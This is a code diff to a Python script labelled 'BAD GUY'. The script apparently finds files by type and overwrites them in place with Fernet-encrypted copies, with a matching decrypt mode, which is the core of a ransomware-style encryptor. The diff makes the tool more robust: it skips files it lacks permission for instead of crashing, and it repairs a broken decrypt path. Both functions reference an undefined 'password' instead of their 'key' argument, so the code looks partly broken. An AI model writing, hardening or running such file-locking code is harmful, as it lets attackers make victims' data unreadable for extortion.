@@ -25,23 +25,30 @@ def find_files(file_type):
 
 def encrypt(filename, key):
     k = generate_key(password)
-    with open(filename, 'rb') as file:
-        file_data = file.read()
-        encrypted = k.encrypt(file_data)
-    with open(filename, 'wb') as file:
-        file.write(encrypted)
+    try:
+        with open(filename, 'rb') as file:
+            file_data = file.read()
+            encrypted = k.encrypt(file_data)
+        with open(filename, 'wb') as file:
+            file.write(encrypted)
+    except PermissionError as e:
+        print(f"PermissionError: {e}. Skipping file: {filename}")
+        pass
 
 def decrypt(filename, key):
     k = generate_key(password)
-    with open(filename, 'rb') as file:
-        encrypted = file.read
     try:
-        decrypted = k.decrypt(encrypted)
+        with open(filename, 'rb') as file:
+            encrypted = file.read()
+            decrypted = k.decrypt(encrypted)
+        with open(filename, 'wb') as file:
+            file.write(decrypted)
+    except PermissionError as e:
+        print(f"PermissionError: {e}. Skipping file: {filename}")
+        pass
     except cryptography.fernet.InvalidToken as e:
-        print(f"Invalid token, {e} ")
+        print(f"Invalid token, {e}. Skipping decryption for file: {filename}")
         return
-    with open(filename, 'wb') as file:
-        file.write(decrypted)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="BAD GUY")
@@ -62,8 +69,6 @@ if __name__ == "__main__":
             decrypt(filename, key)
     else:
         raise TypeError("Either --encrypt or --decrypt must be specified.")
-
-
 
 
 
